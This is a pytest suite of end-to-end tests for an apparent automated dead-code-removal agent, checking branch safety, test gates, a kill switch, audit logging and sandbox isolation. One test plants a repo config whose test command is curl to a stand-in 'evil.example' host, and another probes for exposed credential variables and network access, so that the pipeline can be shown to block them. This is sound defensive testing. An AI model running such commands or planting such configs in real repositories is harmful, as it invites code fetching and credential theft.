"""End-to-end tests of the whole pipeline, including adversarial repos."""
import subprocess
from pathlib import Path

import pytest

from agent.audit import AuditLog
from agent.consent import grant_all
from agent.demo import create_demo_repo
from agent.orchestrator import Orchestrator, RunOptions

ENV = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t", "PATH": "/usr/bin:/bin"}


def git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, env=ENV, check=True).stdout.strip()


def run(repo, out, **kw):
    opts = RunOptions(repo=str(repo), out_dir=out, sandbox="local", allow_unsafe_local=True,
                      consent=grant_all(str(repo)), **kw)
    orch = Orchestrator(opts)
    return orch, orch.run()


def make_repo(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    for c in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-q", "-m", "i"]):
        git(root, *c)
    return root


BASE = {"pytest.ini": "[pytest]\npythonpath = .\ntestpaths = tests\n"}


def test_happy_path_creates_verified_branch_and_never_touches_main(tmp_path):
    repo = create_demo_repo(tmp_path / "demo")
    head = git(repo, "rev-parse", "main")
    orch, st = run(repo, tmp_path / "out", open_pr=True)
    assert st["status"] == "completed"
    cs = st["change_sets"][0]
    assert cs["decision"] == "ready" and all(g["passed"] for g in cs["gates"])
    assert git(repo, "rev-parse", "main") == head                      # main untouched
    branch = cs["branch"]["branch"]
    assert branch.startswith("agent/dead-code/")
    removed = {f["symbol"] for f in cs["findings"]}
    assert removed == {"_legacy_discount", "_unused_helper"}
    utils = git(repo, "show", f"{branch}:shop/utils.py")
    assert "_handle_refund" in utils and "LegacyExporter" in utils     # dynamic/public symbols kept
    assert AuditLog.verify(orch.out / "audit.jsonl")
    assert (orch.out / "pr" / "CS-001.md").exists()


def test_without_open_pr_no_branch_is_created(tmp_path):
    repo = create_demo_repo(tmp_path / "demo")
    _, st = run(repo, tmp_path / "out")
    assert st["change_sets"][0]["decision"] == "ready"
    assert "agent/" not in git(repo, "branch", "-a")


def test_gates_catch_a_removal_that_breaks_tests(tmp_path):
    """Static analysis cannot see getattr with a computed name; the test gate must catch it."""
    repo = make_repo(tmp_path / "r", BASE | {
        "pkg/__init__.py": "",
        "pkg/mod.py": "def _hidden():\n    return 42\n\n\ndef call():\n    import pkg.mod as m\n    return getattr(m, '_' + 'hidden')()\n",
        "tests/test_mod.py": "from pkg.mod import call\n\n\ndef test_call():\n    assert call() == 42\n",
    })
    _, st = run(repo, tmp_path / "out", open_pr=True)
    cs = st["change_sets"][0]
    assert cs["decision"] == "rejected_gates"
    assert not any(g["passed"] is False and g["name"] == "policy" for g in cs["gates"])
    assert "agent/" not in git(repo, "branch", "-a")                    # nothing was pushed


def test_no_tests_means_no_changes(tmp_path):
    repo = make_repo(tmp_path / "r", BASE | {"m.py": "def _x():\n    return 1\n"})
    _, st = run(repo, tmp_path / "out", open_pr=True)
    assert st["change_sets"] == [] and st["baseline"]["green"] is False
    assert "agent/" not in git(repo, "branch", "-a")


def test_failing_baseline_means_no_changes(tmp_path):
    repo = make_repo(tmp_path / "r", BASE | {"m.py": "def _x():\n    return 1\n", "tests/test_f.py": "def test_f():\n    assert False\n"})
    _, st = run(repo, tmp_path / "out")
    assert st["change_sets"] == [] and st["baseline"]["green"] is False


def test_malicious_test_command_is_rejected(tmp_path):
    repo = make_repo(tmp_path / "r", BASE | {
        ".agent.yml": "test:\n  command: [curl, 'https://evil.example/x']\n",
        "m.py": "def _x():\n    return 1\n", "tests/test_a.py": "def test_a():\n    pass\n"})
    _, st = run(repo, tmp_path / "out")
    assert st["status"].startswith("failed") and st["change_sets"] == []


def test_repo_config_cannot_lower_confidence_floor(tmp_path):
    repo = make_repo(tmp_path / "r", BASE | {
        ".agent.yml": "changes:\n  min_confidence: low\n",
        "m.py": "def public_unused():\n    return 1\n\n\ndef used():\n    return 2\n",
        "tests/test_a.py": "from m import used\n\n\ndef test_a():\n    assert used() == 2\n"})
    _, st = run(repo, tmp_path / "out", open_pr=True)
    assert st["change_sets"] == []                                     # medium finding is never auto-removed
    assert "agent/" not in git(repo, "branch", "-a")


def test_tests_cannot_read_credentials_or_reach_network(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_WRITE_TOKEN", "ghp_" + "A" * 36)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-" + "B" * 30)
    probe = (
        "import os, socket\n\n\ndef test_probe():\n"
        "    assert 'AGENT_WRITE_TOKEN' not in os.environ\n"
        "    assert 'ANTHROPIC_API_KEY' not in os.environ\n"
        "    s = socket.socket()\n    s.settimeout(2)\n"
        "    try:\n        s.connect(('1.1.1.1', 53))\n        reached = True\n    except OSError:\n        reached = False\n"
        "    assert not reached\n")
    repo = make_repo(tmp_path / "r", BASE | {"m.py": "x = 1\n", "tests/test_probe.py": probe})
    orch, st = run(repo, tmp_path / "out")
    if not st["sandbox"]["network_isolated"]:
        pytest.skip("network namespace isolation unavailable in this environment")
    assert st["baseline"]["green"] is True, st["baseline"]


def test_kill_switch_aborts_run(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_KILL_SWITCH", "1")
    repo = create_demo_repo(tmp_path / "demo")
    _, st = run(repo, tmp_path / "out", open_pr=True)
    assert st["status"].startswith("aborted") and st["change_sets"] == []


def test_analysis_only_mode_runs_no_code(tmp_path):
    repo = create_demo_repo(tmp_path / "demo")
    _, st = run(repo, tmp_path / "out", run_tests=False)
    assert st["baseline"] is None and st["change_sets"] == []
    assert len(st["findings"]["dead_code"]) == 4 and st["scan"]["sensitive_files"] == [".env"]
